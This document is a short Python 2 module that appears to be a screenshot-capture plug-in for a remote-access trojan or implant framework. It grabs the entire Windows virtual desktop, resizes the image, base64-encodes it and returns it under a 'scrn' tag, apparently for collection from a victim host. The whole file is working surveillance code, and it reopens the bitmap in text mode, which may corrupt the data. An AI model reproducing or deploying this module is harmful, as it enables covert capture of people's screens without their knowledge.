def run(**args):
	try:
		import win32gui
		import win32ui
		import win32con
		import win32api
		import base64
		from PIL import Image
	except:
		print "Could not load the module on this host. Skipping."
		return 0, "failed"
	try:
		hdesktop = win32gui.GetDesktopWindow()
		width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
		height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
		left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
		top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
		desktop_dc = win32gui.GetWindowDC(hdesktop)
		img_dc = win32ui.CreateDCFromHandle(desktop_dc)
		mem_dc = img_dc.CreateCompatibleDC()
		screenshot = win32ui.CreateBitmap()
		screenshot.CreateCompatibleBitmap(img_dc, width, height)
		mem_dc.SelectObject(screenshot)
		mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
		screenshot.SaveBitmapFile(mem_dc, 'screenshot.bmp')
		print "Screenshot taken."
	except:
		print "Could not take screenshot, exiting module..."
		return 0, "failed"
	try:
		imagefile = Image.open('screenshot.bmp')
		imagefile = imagefile.resize((800,600),Image.ANTIALIAS)
		imagefile.save('screenshot.bmp',optimize = True,quality = 95)
		del imagefile
		imagefile = open('screenshot.bmp')
		imgstring = base64.b64encode(imagefile.read())
		del imagefile
		return imgstring, "scrn"
	except:
		print "Could not process the screenshot, exiting module ..."
		return 0, "failed"
